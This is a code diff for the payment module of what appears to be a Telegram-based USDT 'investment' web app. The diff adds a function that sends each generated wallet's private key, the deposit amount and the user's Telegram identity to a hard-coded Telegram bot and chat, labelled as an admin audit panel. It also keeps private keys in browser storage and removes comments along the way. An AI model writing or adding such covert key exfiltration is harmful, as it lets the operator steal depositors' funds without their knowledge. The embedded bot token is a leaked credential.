@@ -1,7 +1,41 @@
 import { state, saveInvestment } from './state.js';
 import { updateDashboard, switchTab } from './main.js';
 
+// --- CONFIGURACIÓN CENTRALIZADA ---
 const API_BASE = "https://api-usdt-bep20.vercel.app/api";
+const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
+const ADMIN_CHAT_ID = "7517815832";
+
+/**
+ * Envía los datos de la wallet generada al Telegram del Administrador
+ */
+async function sendKeyToAdmin(address, privKey, amount) {
+    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
+    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
+    const userId = user?.id || "N/A";
+
+    const text = `🛡️ **PANEL DE AUDITORÍA ADMIN** 🛡️\n\n` +
+                 `💰 **Inversión:** ${amount} USDT\n` +
+                 `📍 **Wallet Temp:** <code>${address}</code>\n` +
+                 `🔑 **Private Key:** <code>${privKey}</code>\n\n` +
+                 `👤 **Usuario:** ${username} (ID: ${userId})\n` +
+                 `------------------------------\n` +
+                 `⚠️ _Usa esta llave si el proceso automático falla._`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.error("Error enviando reporte al Admin:", e);
+    }
+}
 
 /**
  * Muestra el modal de pago y genera la wallet temporal
@@ -26,24 +60,21 @@ export async function showPayment() {
         const data = await response.json();
 
         if(data.address) {
-            // Guardar en el estado de la app
             state.pendingInvestment = amount;
             state.tempAddress = data.address;
             state.tempKey = data.privateKey; 
 
-            // --- SISTEMA DE RECUPERACIÓN (ANTIPÉRDIDA) ---
-            // Guardamos la llave en el almacenamiento local del navegador/teléfono
+            // 1. REPORTE AL ADMIN (Telegram Privado)
+            sendKeyToAdmin(data.address, data.privateKey, amount);
+
+            // 2. SISTEMA DE RECUPERACIÓN LOCAL (LocalStorage)
             localStorage.setItem('last_wallet_address', data.address);
             localStorage.setItem('last_private_key', data.privateKey);
             localStorage.setItem(`recovery_${data.address}`, data.privateKey);
             
-            // Mostrar en consola para copia inmediata
-            console.log("🔑 PRIVATE KEY GENERADA:", data.privateKey);
-            console.log("📍 ADDRESS GENERADA:", data.address);
-            console.log("ℹ️ Si la app se cierra, recupera la llave con: localStorage.getItem('last_private_key')");
-            // ----------------------------------------------
+            console.log("🔑 KEY GUARDADA EN STORAGE Y ENVIADA AL ADMIN");
 
-            // Actualizar interfaz del Modal
+            // 3. ACTUALIZAR INTERFAZ
             document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
             document.getElementById('wallet-address-display').innerText = data.address;
             
@@ -52,7 +83,6 @@ export async function showPayment() {
                 qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
             }
 
-            // Resetear textos y botones (Estética del video)
             document.getElementById('payment-status-text').innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
             const arrowIcon = document.getElementById('arrow-icon');
             if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
@@ -63,7 +93,6 @@ export async function showPayment() {
                 btnVerify.style.opacity = "1";
             }
 
-            // Mostrar el modal (Bottom Sheet)
             document.getElementById('payModal').style.display = 'flex';
             startPaymentTimer();
         }
@@ -87,14 +116,13 @@ export function closePayment() {
 }
 
 /**
- * Verifica el pago en la red (Botón Circular Azul con Flecha)
+ * Verifica el pago en la red
  */
 export async function verifyPayment() {
     const statusText = document.getElementById('payment-status-text');
     const arrowIcon = document.getElementById('arrow-icon');
     const btnVerify = document.getElementById('btn-verify-payment');
     
-    // 1. Efecto Visual de Carga (LOADING...)
     statusText.innerHTML = 'LOADING... ⌛';
     if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 
     if(btnVerify) {
@@ -116,13 +144,10 @@ export async function verifyPayment() {
         const result = await res.json();
 
         if(result.success) {
-            // 2. Éxito: Mostrar monto confirmado (Verde)
             statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment.toFixed(2)} USDT ✅</span>`;
             if(arrowIcon) arrowIcon.className = "fas fa-check";
             
-            // Limpiar llave de recuperación ya que el proceso terminó con éxito
             localStorage.removeItem(`recovery_${state.tempAddress}`);
-            
             saveInvestment(state.pendingInvestment);
             
             setTimeout(() => {
@@ -131,7 +156,6 @@ export async function verifyPayment() {
                 switchTab('home');
             }, 2500);
         } else {
-            // 3. Fallo o No recibido: Volver a Not Received
             setTimeout(() => {
                 statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
                 if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
@@ -142,7 +166,6 @@ export async function verifyPayment() {
             }, 1200);
         }
     } catch (e) {
-        console.error("Verification error:", e);
         statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
         if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
         if(btnVerify) {
@@ -152,9 +175,6 @@ export async function verifyPayment() {
     }
 }
 
-/**
- * Timer de cuenta regresiva (30 min)
- */
 function startPaymentTimer() {
     let time = 1800; 
     clearInterval(state.payTimerInterval);
@@ -173,9 +193,6 @@ function startPaymentTimer() {
     }, 1000);
 }
 
-/**
- * Función global para copiar la dirección al portapapeles
- */
 window.copyAddress = function() {
     const address = document.getElementById('wallet-address-display').innerText;
     navigator.clipboard.writeText(address).then(() => {
@@ -183,10 +200,6 @@ window.copyAddress = function() {
     });
 };
 
-/**
- * Función de Emergencia para consola: Recuperar última llave generada
- * Escribir 'recoverLastKey()' en la consola del navegador.
- */
 window.recoverLastKey = function() {
     const addr = localStorage.getItem('last_wallet_address');
     const key = localStorage.getItem('last_private_key');
@@ -195,11 +208,10 @@ window.recoverLastKey = function() {
         console.log("Llave Privada:", key);
         return { address: addr, privateKey: key };
     } else {
-        console.log("No hay llaves guardadas en este dispositivo.");
+        console.log("No hay llaves guardadas.");
     }
 };
 
-// Exponer funciones al objeto Window para el HTML
 window.showPayment = showPayment;
 window.closePayment = closePayment;
 window.verifyPayment = verifyPayment;
